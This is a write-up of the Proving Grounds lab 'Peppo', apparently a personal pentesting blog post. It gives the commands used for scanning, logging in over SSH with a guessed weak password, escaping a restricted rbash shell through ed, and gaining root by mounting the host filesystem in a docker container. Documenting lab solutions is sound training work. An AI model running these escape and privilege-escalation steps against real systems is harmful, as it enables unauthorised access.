---
title: Peppo
date: 2026-06-23T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - gobuster
  - ed
  - rbash
  - docker
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Peppo"
---
“I have problems with turns, because I'm left-handed, and they haven't built a left-handed runway yet.” 
– Derek Zoolander

 nmap 192.168.144.60 -p- -sS -sC -sV --min-rate 5000

![](Screenshot%202026-06-23%20at%2012.20.24.png)
![](Screenshot%202026-06-23%20at%2012.21.09.png)

`whatweb http://192.168.144.60:8080`

![](Screenshot%202026-06-23%20at%2012.25.39.png)

![](Screenshot%202026-06-23%20at%2012.24.07.png)

	admin:admin

![](Screenshot%202026-06-23%20at%2012.25.09.png)

![](Screenshot%202026-06-23%20at%2012.52.24.png)

Seems that these we're red herrings. Its rare that ssh is a the attack vector. 
I have to check the offsec lab learning objectives. I points to a weak ssh password. 

![](Screenshot%202026-06-24%20at%2019.51.57.png)

I tried eleanor as the ssh user and again as the password and was gifted a ssh session.  
`ssh eleanor@192.168.118.60`  
Password:`eleanor`

![](Screenshot%202026-06-24%20at%2008.20.07.png)

![](Screenshot%202026-06-24%20at%2008.19.31.png)

In the environment I am unable to use cat, cd. rbash is a restricted shell that in this case limits me to very little.

`echo "$(<file.txt)"`

![](Screenshot%202026-06-24%20at%2012.16.20.png)

![](Screenshot%202026-06-24%20at%2012.18.05.png)

After looking around I found although in rbash I was able to run these comands:

![](Screenshot%202026-06-24%20at%2016.33.10.png)

'ed' is a text editor, it also has a gtfobins entry. I tried a lot of different commands before I found this:   
`https://0xffsec.com/handbook/shells/restricted-shells/`

`https://gtfobins.org/gtfobins/ed/#shell`

![](Screenshot%202026-06-24%20at%2016.34.36.png)

![](Screenshot%202026-06-24%20at%2016.36.16.png)

... docker 😈

First though lets get a nice shell and update out path:  
`/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'`  
`export  PATH=$PATH:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games`

`docker ps`

![](Screenshot%202026-06-24%20at%2016.42.03.png)

https://hacktricks.wiki/en/network-services-pentesting/2375-pentesting-docker.html?highlight=docker#docker-basics

![](Screenshot%202026-06-24%20at%2020.13.42.png)

`docker run -v /:/mnt --rm -it redmine chroot /mnt sh`

![](Screenshot%202026-06-24%20at%2016.28.37.png)

